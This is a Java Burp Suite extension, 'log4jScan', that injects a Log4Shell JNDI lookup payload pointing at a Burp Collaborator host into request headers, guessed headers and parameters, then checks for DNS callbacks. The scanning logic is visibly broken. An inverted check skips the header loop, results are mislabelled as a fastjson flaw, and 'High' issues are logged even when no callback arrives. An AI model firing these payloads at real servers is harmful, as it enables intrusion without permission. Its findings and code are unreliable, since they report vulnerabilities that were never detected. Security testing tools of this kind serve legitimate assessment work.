package burp;
import java.awt.event.*;
//https://github.com/bit4woo/burp-api-drops  json数据的解析
import java.awt.Component;
import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.stream.Collectors;
import javax.swing.*;
import javax.swing.event.MouseInputListener;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableModel;
//public class BurpExtender extends AbstractTableModel implements IBurpExtender, ITab, IHttpListener, IMessageEditorController,IScannerCheck,IContextMenuFactory

public class BurpExtender extends AbstractTableModel implements IBurpExtender, ITab, IMessageEditorController,IScannerCheck,IContextMenuFactory
{
    PrintWriter stdout;
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private JSplitPane splitPane;
    private IMessageEditor requestViewer;
    private IMessageEditor responseViewer;
    private final List<LogEntry> log = new ArrayList<LogEntry>();
    private IHttpRequestResponse currentlyDisplayedItem;

    //
    // implement IBurpExtender
    //
    private final String[] HEADER_GUESS = new String[]{
            "User-Agent",
            "Referer",
            "X-Client-IP",
            "X-Remote-IP",
            "X-Remote-Addr",
            "X-Forwarded-For",
            "X-Originating-IP",
            "Originating-IP",
            "CF-Connecting_IP",
            "True-Client-IP",
            "X-Forwarded-For",
            "Originating-IP",
            "X-Real-IP",
            "Forwarded",
            "X-Api-Version",
            "X-Wap-Profile",
            "Contact"
    };
    private final String[] HEADER_BLACKLIST = new String[]{
            "content-length",
            "cookie",
            "host",
            "content-type"
    };





    @Override
    public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks)
    {




        // keep a reference to our callbacks object
        this.callbacks = callbacks;
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        // obtain an extension helpers object
        helpers = callbacks.getHelpers();
        this.helpers=helpers;
        // set our extension name
        callbacks.setExtensionName("log4jScan");
        callbacks.registerScannerCheck(BurpExtender.this);
        callbacks.registerContextMenuFactory(this);
        // create our UI
        SwingUtilities.invokeLater(new Runnable()
        {
            @Override
            public void run()
            {



                // main split pane
                splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
                requestViewer = callbacks.createMessageEditor(BurpExtender.this, false);
                responseViewer = callbacks.createMessageEditor(BurpExtender.this, false);
//                JSplitPane splitPane2=new JSplitPane(JSplitPane.VERTICAL_SPLIT);

                JTabbedPane tabs = new JTabbedPane();
                JTabbedPane tabs1 = new JTabbedPane();

                tabs.addTab("Request", requestViewer.getComponent());
                tabs1.addTab("Response", responseViewer.getComponent());
                JSplitPane splitPane2=new JSplitPane(JSplitPane.HORIZONTAL_SPLIT,tabs,tabs1);
//                // table of log entries
//                splitPane2.setLeftComponent(requestViewer.getComponent());
//                splitPane2.setRightComponent(responseViewer.getComponent());
//                DefaultTableModel moble=new DefaultTableModel();
                Table logTable = new Table(BurpExtender.this);
                JScrollPane scrollPane = new JScrollPane(logTable);
                splitPane.setLeftComponent(scrollPane);
                logTable.getSelectionModel().setSelectionMode(ListSelectionModel.MULTIPLE_INTERVAL_SELECTION);
                JPopupMenu popup = new JPopupMenu();
                JMenuItem jMenuItem1 = new JMenuItem();
                jMenuItem1.setText("删除");

                jMenuItem1.addMouseListener(new MouseAdapter() {
                    @Override
                    public void mousePressed(MouseEvent e) {//只能检测到mousePressed事件
                        super.mouseClicked(e);
                        int [] a=logTable.getSelectedRows();
                        for(int i = 0; i<a.length;i++){



                            log.remove(a[i]);
                            stdout.println(i);
                            stdout.println(log);

                        }


                    }
                });

                popup.add(jMenuItem1);
                popup.add(new   JMenuItem("MenuItem-1"));
                popup.add(new   JMenuItem("MenuItem-2"));
                popup.add(new   JMenuItem("MenuItem-3"));

                MouseInputListener mil = new MouseInputListener()
                {

                    public void mouseClicked(MouseEvent e)
                    {
                        processEvent(e);
                    }
                    public void mousePressed(MouseEvent e)
                    {
                        processEvent(e);
                    }
                    public void mouseReleased(MouseEvent e)
                    {
                        processEvent(e);
                        if ((e.getModifiers() & MouseEvent.BUTTON3_MASK) != 0 && !e.isControlDown() && !e.isShiftDown())
                        {
                            popup.show(logTable, e.getX(), e.getY());
                        }
                    }
                    public void mouseEntered(MouseEvent e)
                    {
                        processEvent(e);
                    }

                    public void mouseExited(MouseEvent e)
                    {
                        processEvent(e);
                    }
                    public void mouseDragged(MouseEvent e)
                    {
                        processEvent(e);
                    }
                    public void mouseMoved(MouseEvent e)
                    {
                        processEvent(e);
                    }
                    private void processEvent(MouseEvent e)
                    {
                        if ((e.getModifiers() & MouseEvent.BUTTON3_MASK) != 0)
                        {
                            int modifiers = e.getModifiers();
                            modifiers -= MouseEvent.BUTTON3_MASK;
                            modifiers |= MouseEvent.BUTTON1_MASK;
                            MouseEvent ne = new MouseEvent(e.getComponent(), e.getID(), e.getWhen(), modifiers, e.getX(), e .getY(), e.getClickCount(), false);
                            logTable.dispatchEvent(ne);
                        }
                    }

                };
                logTable.addMouseListener(mil);
                logTable.addMouseMotionListener(mil);



                splitPane2.addComponentListener(new ComponentAdapter(){
                    public void componentResized(ComponentEvent e) {
                        splitPane2.setDividerLocation(0.5);
                    }
                });


//
//                // tabs with request/response viewers

//                splitPane2.setLeftComponent(tabs);
//                splitPane2.setRightComponent(tabs1);

//                splitPane2.setTopComponent(requestViewer.getComponent());
//                splitPane2.setBottomComponent(responseViewer.getComponent());

                splitPane.setRightComponent(splitPane2);
                callbacks.addSuiteTab(BurpExtender.this);
                // customize our UI components
                callbacks.customizeUiComponent(splitPane);
                callbacks.customizeUiComponent(logTable);
                callbacks.customizeUiComponent(splitPane2);
                callbacks.customizeUiComponent(tabs);
                callbacks.customizeUiComponent(tabs1);
                // add the custom tab to Burp's UI


                // register ourselves as an HTTP listener
//                callbacks.registerHttpListener(BurpExtender.this);
            }
        });

    }

    //
    // implement ITab
    //

    @Override
    public String getTabCaption()
    {
        return "log4jScan";
    }

    @Override
    public Component getUiComponent()
    {
        return splitPane;
    }

    //
    // implement IHttpListener
    //

//    @Override
//    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo)
//    {
//        // only process responses
//        if (!messageIsRequest)
//        {
//            // create a new log entry with the message details
//            synchronized(log)
//            {
//                int row = log.size();
//                log.add(new LogEntry(toolFlag, callbacks.saveBuffersToTempFiles(messageInfo),
//                        helpers.analyzeRequest(messageInfo).getUrl()));
//                fireTableRowsInserted(row, row);
//            }
//        }
//    }

    //
    // extend AbstractTableModel
    //

    @Override
    public int getRowCount()
    {
        return log.size();
    }

    @Override
    public int getColumnCount()
    {
        return 3;
    }

    @Override
    public String getColumnName(int columnIndex)
    {
        switch (columnIndex){
            case 0:
                return "URL";
            case 1:
                return "Status";
            case 2:
                return "result";
            default:
                return "";
        }
    }

    @Override
    public Class<?> getColumnClass(int columnIndex)
    {
        return String.class;
    }

    @Override
    public Object getValueAt(int rowIndex, int columnIndex)
    {
        LogEntry logEntry = log.get(rowIndex);

        switch (columnIndex)
        {
            case 0:
                return logEntry.url.toString();
            case 1:
                return logEntry.status;
            case 2:
                return logEntry.res;
            default:
                return "";
        }
    }

    //
    // implement IMessageEditorController
    // this allows our request/response viewers to obtain details about the messages being displayed
    //

    @Override
    public byte[] getRequest()
    {
        return currentlyDisplayedItem.getRequest();
    }

    @Override
    public byte[] getResponse()
    {
        return currentlyDisplayedItem.getResponse();
    }

    @Override
    public IHttpService getHttpService()
    {
        return currentlyDisplayedItem.getHttpService();
    }

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
//        this.stdout.println("doPassiveScan");
//        List<IScanIssue> issues = new ArrayList<>();
//
//        //获取检查的url
//        URL url = helpers.analyzeRequest(baseRequestResponse).getUrl();
//        this.stdout.println(url);
//        String scanType="doPassiveScanbei";
//
//        issues = doScan(scanType, baseRequestResponse,1);
//        return issues;
        return null;
    }


//    private List<IScanIssue> doScan(String scanType, IHttpRequestResponse baseRequestResponse,int row) {
    private void doScan(String scanType, IHttpRequestResponse baseRequestResponse,int row) {
        boolean  flags=false;

        this.stdout.println(scanType);
        List<IScanIssue> issues = new ArrayList<>();
        IScanIssue issuesss;
//        URL url = helpers.analyzeRequest(baseRequestResponse).getUrl();
        //构造dns器
//        IBurpCollaboratorClientContext collaboratorClientContext = callbacks.createBurpCollaboratorClientContext();
        String mes = "find fastjson =< 1.2.24 Deserialization vulnerability(Testecho)";
        URL url = this.helpers.analyzeRequest(baseRequestResponse).getUrl();
        IRequestInfo req = this.helpers.analyzeRequest(baseRequestResponse);
        byte[] rawRequest = baseRequestResponse.getRequest();
//        List<String> payloads = new ArrayList<String>();
//        payloads.add("${jndi:ldap://%s/" + Utils.GetRandomNumber(100000, 999999) + "}");
        String method = this.helpers.analyzeRequest(baseRequestResponse).getMethod();
        // 返回的是一个字节，不同的content-type用不同的数字代表，其中4表示application/json
        byte content_type = this.helpers.analyzeRequest(baseRequestResponse).getContentType();
        // 拿到的headers是一个数组类型，每一个元素都是类似这样：Host: 127.0.0.1
        List<String> headers = this.helpers.analyzeRequest(baseRequestResponse).getHeaders();
        List<String> guessHeaders = new ArrayList(Arrays.asList(HEADER_GUESS));
        IBurpCollaboratorClientContext context = this.callbacks.createBurpCollaboratorClientContext();
        String dnslog = context.generatePayload(true);
        List<IBurpCollaboratorInteraction> dnsres = new ArrayList<>();
        List<String> payloads = new ArrayList<String>();

        String exps = "${jndi:ldap://" + dnslog + "/" + Utils.GetRandomNumber(100000, 999999) + "}";
//        IHttpRequestResponse resp = this.callbacks.makeHttpRequest(iHttpService, postMessage);

        this.stdout.println(dnsres);
        payloads.add(exps);
        int ssss=2;

        for (int i = 1; i < headers.size(); i++) {
        if(!flags){

            break;

        }
            HttpHeader header = new HttpHeader(headers.get(i));
            if (Arrays.stream(HEADER_BLACKLIST).noneMatch(h -> h.equalsIgnoreCase(header.Name))) {
                List<String> needSkipheader = guessHeaders.stream().filter(h -> h.equalsIgnoreCase(header.Name)).collect(Collectors.toList());
                needSkipheader.forEach(guessHeaders::remove);
                for (String exp:payloads) {
                    List<String> tmpHeaders = new ArrayList<>(headers);
                    header.Value = exp;
                    tmpHeaders.set(i, header.toString());
                    byte[] tmpRawRequest = this.helpers.buildHttpMessage(tmpHeaders, Arrays.copyOfRange(rawRequest, req.getBodyOffset(), rawRequest.length));
                    IHttpRequestResponse tmpReq = this.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), tmpRawRequest);

                    try {
                        Thread.sleep(2000);
                    } catch (InterruptedException e) {

                        this.stdout.println();
                        e.printStackTrace();
                    }

                    dnsres = context.fetchCollaboratorInteractionsFor(dnslog);
                    if (!dnsres.isEmpty()) {
                        this.stdout.println("found!!!");
//                    LogEntry logEntry = new LogEntry(url, "finished", "vul!!!", resp);
//                    log.set(row, logEntry);
//                    fireTableRowsUpdated(row, row);

                        // 漏洞存在就更新表格中存在漏洞那一行的数据
                        LogEntry logEntry1 = new LogEntry(this.helpers.analyzeRequest(tmpReq).getUrl(), "finished", "vul!!!", tmpReq);
                        log.set(row, logEntry1);
                        fireTableRowsUpdated(row, row);
                        flags = true;
                        break;
                    }
                }


            }
        }

        for (String headerName : guessHeaders) {

            for (String exp:payloads) {
                List<String> tmpHeaders = new ArrayList<>(headers);
                tmpHeaders.add(String.format("%s: %s", headerName, exp));
                byte[] tmpRawRequest = this.helpers.buildHttpMessage(tmpHeaders, Arrays.copyOfRange(rawRequest, req.getBodyOffset(), rawRequest.length));
                IHttpRequestResponse tmpReq = this.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), tmpRawRequest);
                dnsres = context.fetchCollaboratorInteractionsFor(dnslog);
                try {
                    Thread.sleep(2000);
                } catch (InterruptedException e) {

                    this.stdout.println();
                    e.printStackTrace();
                }
                if (!dnsres.isEmpty()) {
                    this.stdout.println("found!!!");
//                    LogEntry logEntry = new LogEntry(url, "finished", "vul!!!", resp);
//                    log.set(row, logEntry);
//                    fireTableRowsUpdated(row, row);

                    // 漏洞存在就更新表格中存在漏洞那一行的数据
                    LogEntry logEntry1 = new LogEntry(this.helpers.analyzeRequest(tmpReq).getUrl(), "finished", "vul!!!", tmpReq);
                    log.set(row, logEntry1);
                    fireTableRowsUpdated(row, row);
                    flags=true;
                    break;
                }

            }

            if(flags){

                break;

            }
        }

        if (!flags){

            if (req.getParameters().size()>0){
//                11111111111111111111111



            for (IParameter param :
                    req.getParameters()) {
                ssss=ssss+1;
                if(flags){

                    break;
                }

                this.stdout.println(ssss);
//            String tmpDomain = dnslog;
                byte[] tmpRawRequest1 = rawRequest;


                boolean hasModify = false;
                for (String exp1:payloads){
                    switch (param.getType()) {
                        case IParameter.PARAM_URL:
                        case IParameter.PARAM_BODY:
                        case IParameter.PARAM_COOKIE:
                            exp1 = this.helpers.urlEncode(exp1);
                            IParameter newParam = this.helpers.buildParameter(param.getName(), exp1, param.getType());
                            tmpRawRequest1 = this.helpers.updateParameter(rawRequest, newParam);
                            hasModify = true;
                            break;
                        case IParameter.PARAM_JSON:
//                    exp = this.helpers.urlEncode(exp);
//                    IParameter newParam1 = this.helpers.buildParameter(param.getName(), exp, param.getType());
//                    tmpRawRequest = this.helpers.updateParameter(rawRequest, newParam1);
//                    hasModify = true;
//                    break;
                        case IParameter.PARAM_XML:
                        case IParameter.PARAM_MULTIPART_ATTR:
                        case IParameter.PARAM_XML_ATTR:


                    }
                    if (hasModify) {

                        IHttpRequestResponse tmpReqq = this.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), tmpRawRequest1);

                        tmpReqq.getResponse();
                        try {
                            Thread.sleep(2000);
                        } catch (InterruptedException e) {

                            this.stdout.println();
                            e.printStackTrace();
                        }
                        dnsres = context.fetchCollaboratorInteractionsFor(dnslog);
//                if (!dnsres.isEmpty()) {
                        if (!dnsres.isEmpty()) {
                            this.stdout.println("found!!!");
                            flags=true;
                            // 漏洞存在就更新表格中存在漏洞那一行的数据
                            LogEntry logEntry1 = new LogEntry(this.helpers.analyzeRequest(tmpReqq).getUrl(), "finished", "vul!!!", tmpReqq);
                            log.set(row, logEntry1);
                            fireTableRowsUpdated(row, row);
//                    fireTableRowsInserted(row, row);

                            issuesss = new CustomScanIssue(
                                    baseRequestResponse.getHttpService(),
                                    url,
                                    new IHttpRequestResponse[]{baseRequestResponse},
                                    "fastjson Deserialization vulnerability",
                                    mes,
                                    "High"
                            );
                            issues.add(issuesss);
//                     return issues;

                            // 这个方法是swing中的一个方法，会通知表格更新指定行的数据

                            break;
                        }



//                domainMap.put(tmpDomain, new ScanItem(param, tmpReq));

                    }else {

                        flags=true;
                        LogEntry logEntry = new LogEntry(url, "not supported", "not supported", baseRequestResponse);
                        log.set(row, logEntry);
                        fireTableRowsUpdated(row, row);


                        issuesss = new CustomScanIssue(
                                baseRequestResponse.getHttpService(),
                                url,
                                new IHttpRequestResponse[]{baseRequestResponse},
                                "fastjson Deserialization vulnerability",
                                mes,
                                "High"
                        );
                        issues.add(issuesss);


                    }
                }








            }


            if(!flags){

                flags=false;
                LogEntry logEntry = new LogEntry(url, "not supported", "not supported", baseRequestResponse);
                log.set(row, logEntry);
                fireTableRowsUpdated(row, row);


                issuesss = new CustomScanIssue(
                        baseRequestResponse.getHttpService(),
                        url,
                        new IHttpRequestResponse[]{baseRequestResponse},
                        "fastjson Deserialization vulnerability",
                        mes,
                        "High"
                );
                issues.add(issuesss);

            }
stdout.println("asdasd");


        }else {

                flags=false;
                LogEntry logEntry = new LogEntry(url, "not supported", "not supported", baseRequestResponse);
                log.set(row, logEntry);
                fireTableRowsUpdated(row, row);


                issuesss = new CustomScanIssue(
                        baseRequestResponse.getHttpService(),
                        url,
                        new IHttpRequestResponse[]{baseRequestResponse},
                        "fastjson Deserialization vulnerability",
                        mes,
                        "High"
                );
                issues.add(issuesss);



        }


        }
//    return  null;
    }
        @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {





        return null;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        return 0;
    }

    @Override
    public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation) {


        List<JMenuItem> menus = new ArrayList<>(1);
        final IHttpRequestResponse[] messages = invocation.getSelectedMessages();
        if (messages == null || messages.length == 0) return null;
        JMenuItem i1 = new JMenuItem("log4jScan");
        i1.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                for (IHttpRequestResponse message : messages) {
//                for meesage in messages:
                    int row = log.size();
                    LogEntry logEntry = new LogEntry(helpers.analyzeRequest(message).getUrl(), "scanning", "", message);
                    log.add(logEntry);
                    fireTableRowsInserted(row, row);
                    // 在事件触发时是不能发送网络请求的，否则可能会造成整个burp阻塞崩溃，所以必须要新起一个线程来进行漏洞检测
                    Thread thread = new Thread(new Runnable() {
                        @Override
                        public void run() {
                            doScan("asd", message, row);
                        }
                    });
                    thread.start();
                }
            }
        });
        JMenuItem i2 = new JMenuItem("testtttt");
        i2.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                copyMessages(messages, true);
            }
        });
        return Arrays.asList(i1, i2);


//        return null;
    }



    private void copyMessages(IHttpRequestResponse[] messages, boolean withSessionObject) {
        for (IHttpRequestResponse message : messages) {
//            doScan("扫描",message);
            int a=3;


        }


    }

    //
    // extend JTable to handle cell selection
    //

    private class Table extends JTable
    {
        public Table(TableModel tableModel)
        {
            super(tableModel);
        }

        @Override
        public void changeSelection(int row, int col, boolean toggle, boolean extend)
        {
            // show the log entry for the selected row
            LogEntry logEntry = log.get(row);
            requestViewer.setMessage(logEntry.requestResponse.getRequest(), true);
            responseViewer.setMessage(logEntry.requestResponse.getResponse(), false);
            currentlyDisplayedItem = logEntry.requestResponse;
//            this.addMouseListener(new MouseAdapter() {
//                @Override
//                public void mouseReleased(MouseEvent mouseEvent) {
//                    if (SwingUtilities.isLeftMouseButton(mouseEvent)) {
//                        int col = this.columnAtPoint(mouseEvent.getPoint());
//                        int row = this.rowAtPoint(mouseEvent.getPoint());
//                        ((TagTableModel) getModel()).onClick(row, col);
//                    }
//                }
//            });
            super.changeSelection(row, col, toggle, extend);
        }
    }

    //
    // class to hold details of each log entry
    //

    private static class LogEntry
    {
        final URL url;
        final String status;
        final String res;
        final IHttpRequestResponse requestResponse;

        LogEntry(URL url, String status, String res, IHttpRequestResponse requestResponse) {
            this.url = url;
            this.status = status;
            this.res = res;
            this.requestResponse = requestResponse;
        }
    }


        class HttpHeader {
            public String Name;
            public String Value = "";

            public HttpHeader(String src) {
                int headerLength = src.indexOf(':');
                if (headerLength > -1) {
                    Name = src.substring(0, headerLength);
                    Value = src.substring(headerLength + 1).trim();
                } else {
                    Name = src;
                }
            }

            @Override
            public String toString() {
                return String.format("%s: %s", Name, Value);
            }
        }
}




